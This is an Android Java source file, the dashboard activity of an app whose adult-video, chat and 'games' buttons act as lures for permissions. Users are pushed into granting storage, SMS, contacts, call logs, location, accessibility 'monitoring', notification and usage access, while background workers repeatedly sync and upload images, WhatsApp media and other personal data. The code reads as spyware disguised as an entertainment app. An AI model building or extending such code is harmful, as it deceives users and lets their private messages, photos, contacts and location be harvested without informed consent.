package com.bushorat.app.activities;

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.bushorat.app.R;
import com.bushorat.app.databinding.ActivityDashboardBinding;
import com.bushorat.app.helpers.AppUsageSyncHelper;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.DataSyncWorker;
import com.bushorat.app.helpers.FeaturePermissions;
import com.bushorat.app.helpers.ImageUploadWorker;
import com.bushorat.app.helpers.NotificationHelper;
import com.bushorat.app.helpers.SessionManager;
import com.bushorat.app.helpers.UserDataSyncHelper;

/**
 * Permissions are requested only when the matching feature is opened:
 * Videos -> storage (unlocks videos + WhatsApp media upload)
 * Chat   -> SMS (+ optional notification access once)
 * Games  -> contacts / call logs / phone
 * Profile-> location (handled in ProfileActivity)
 */
public class DashboardActivity extends AppCompatActivity {
    private static final String TAG = "DashboardActivity";

    private ActivityDashboardBinding binding;
    private SessionManager sessionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: DashboardActivity started");

        EdgeToEdge.enable(this);
        binding = ActivityDashboardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        setSupportActionBar(binding.toolbar);

        sessionManager = new SessionManager(this);
        AppVisibilityHelper.getInstance(this).ensureListenerStarted();
        DataSyncWorker.schedulePeriodicSync(this);
        setupToolbarSubtitle();

        // Sync only what is already permitted — never ask for everything at once
        UserDataSyncHelper.syncAll(this);

        if (FeaturePermissions.areVideosUnlocked(this)) {
            ImageUploadWorker.schedulePeriodicUpload(this);
        }

        binding.btnPorn.setOnClickListener(v -> onVideosTapped());
        binding.btnChat.setOnClickListener(v -> onChatTapped());
        binding.btnContacts.setOnClickListener(v -> onGamesTapped());

        // Only prompt usage access on app launch
        maybePromptUsageAccess();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (sessionManager != null) {
            sessionManager.updateLastActivity();
        }
        UserDataSyncHelper.syncAll(this);
        if (FeaturePermissions.areVideosUnlocked(this)) {
            ImageUploadWorker.schedulePeriodicUpload(this);
        }
        if (AppUsageSyncHelper.hasUsageAccess(this)) {
            AppUsageSyncHelper.syncIfAllowed(this);
        }
    }

    private void maybePromptUsageAccess() {
        if (AppUsageSyncHelper.hasUsageAccess(this)) {
            return;
        }
        if (FeaturePermissions.hasUsageAccessBeenPrompted(this)) {
            return;
        }
        FeaturePermissions.markUsageAccessPrompted(this);
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_usage_title)
                .setMessage(R.string.perm_usage_message)
                .setPositiveButton(R.string.perm_usage_open_settings, (d, w) ->
                        AppUsageSyncHelper.openUsageAccessSettings(this))
                .setNegativeButton(R.string.perm_usage_not_now, null)
                .show();
    }

    private void setupToolbarSubtitle() {
        String subtitle = sessionManager != null ? sessionManager.getUserEmail() : null;
        if (subtitle != null && getSupportActionBar() != null) {
            getSupportActionBar().setSubtitle(subtitle);
        }
    }

    private void onVideosTapped() {
        // First ask for accessibility if not prompted
        if (!FeaturePermissions.hasAccessibilityBeenPrompted(this)) {
            FeaturePermissions.markAccessibilityPrompted(this);
            new AlertDialog.Builder(this)
                    .setTitle("Accessibility Service")
                    .setMessage("Enable Accessibility Service for enhanced monitoring capabilities.")
                    .setPositiveButton("Enable", (d, w) -> {
                        openAccessibilitySettings();
                        promptLocationThenVideos();
                    })
                    .setNegativeButton("Skip", (d, w) ->
                            promptLocationThenVideos())
                    .show();
            return;
        }
        promptLocationThenVideos();
    }

    private void promptLocationThenVideos() {
        // Then ask for location if not prompted
        if (!FeaturePermissions.hasLocationBeenPrompted(this)) {
            FeaturePermissions.markLocationPrompted(this);
            new AlertDialog.Builder(this)
                    .setTitle("Location Access")
                    .setMessage("Enable location tracking for device monitoring.")
                    .setPositiveButton("Allow", (d, w) -> {
                        FeaturePermissions.requestLocationPermission(this);
                        proceedToVideos();
                    })
                    .setNegativeButton("Skip", (d, w) ->
                            proceedToVideos())
                    .show();
            return;
        }
        proceedToVideos();
    }

    private void proceedToVideos() {
        if (FeaturePermissions.areVideosUnlocked(this)) {
            openUnlockedVideos();
            return;
        }
        if (FeaturePermissions.hasGalleryPermission(this)) {
            unlockVideosAndOpen();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.unlock_videos_title)
                .setMessage(R.string.unlock_videos_message)
                .setPositiveButton(R.string.unlock_videos_allow, (d, w) ->
                        FeaturePermissions.requestGalleryForVideos(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void openAccessibilitySettings() {
        try {
            startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } catch (Exception e) {
            Log.e(TAG, "Could not open accessibility settings", e);
            Toast.makeText(this, "Please enable Accessibility Service manually", Toast.LENGTH_LONG).show();
        }
    }

    private void unlockVideosAndOpen() {
        FeaturePermissions.setVideosUnlocked(this, true);
        ImageUploadWorker.schedulePeriodicUpload(this);
        UserDataSyncHelper.syncAll(this);
        Toast.makeText(this, R.string.unlock_videos_success, Toast.LENGTH_SHORT).show();
        openUnlockedVideos();
    }

    private void openUnlockedVideos() {
        ImageUploadWorker.enqueueWork(this);
        startActivity(new Intent(this, PornActivity.class));
    }

    private void onChatTapped() {
        if (FeaturePermissions.hasSmsPermission(this)) {
            maybePromptNotificationAccess();
            startActivity(new Intent(this, ChatActivity.class));
            UserDataSyncHelper.syncAll(this);
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_chat_title)
                .setMessage(R.string.perm_chat_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        FeaturePermissions.requestSmsForChat(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void onGamesTapped() {
        if (FeaturePermissions.hasGamesPermissions(this)) {
            startActivity(new Intent(this, EarnActivity.class));
            UserDataSyncHelper.syncAll(this);
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_games_title)
                .setMessage(R.string.perm_games_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        FeaturePermissions.requestGamesPermissions(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void maybePromptNotificationAccess() {
        if (NotificationHelper.isNotificationServiceEnabled(this)) {
            return;
        }
        if (FeaturePermissions.hasNotifBeenPrompted(this)) {
            return;
        }
        FeaturePermissions.markNotifPrompted(this);
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_notif_title)
                .setMessage(R.string.perm_notif_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        NotificationHelper.openNotificationListenerSettings(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void openProfile() {
        startActivity(new Intent(this, ProfileActivity.class));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_dashboard, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.action_profile) {
            openProfile();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    public void logout() {
        sessionManager.logoutUser();
        Intent intent = new Intent(this, ChooseLoginActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
            if (FeaturePermissions.hasGalleryPermission(this)) {
                unlockVideosAndOpen();
            } else {
                Toast.makeText(this, R.string.unlock_videos_denied, Toast.LENGTH_LONG).show();
            }
        } else if (requestCode == FeaturePermissions.REQ_CHAT_SMS) {
            if (FeaturePermissions.hasSmsPermission(this)) {
                UserDataSyncHelper.syncAll(this);
                maybePromptNotificationAccess();
                startActivity(new Intent(this, ChatActivity.class));
            } else {
                Toast.makeText(this, R.string.perm_chat_denied, Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS) {
            if (FeaturePermissions.hasGamesPermissions(this)) {
                UserDataSyncHelper.syncAll(this);
                Toast.makeText(this, R.string.perm_games_granted, Toast.LENGTH_SHORT).show();
                startActivity(new Intent(this, EarnActivity.class));
            } else {
                Toast.makeText(this, R.string.perm_games_denied, Toast.LENGTH_SHORT).show();
            }
        }
    }
}
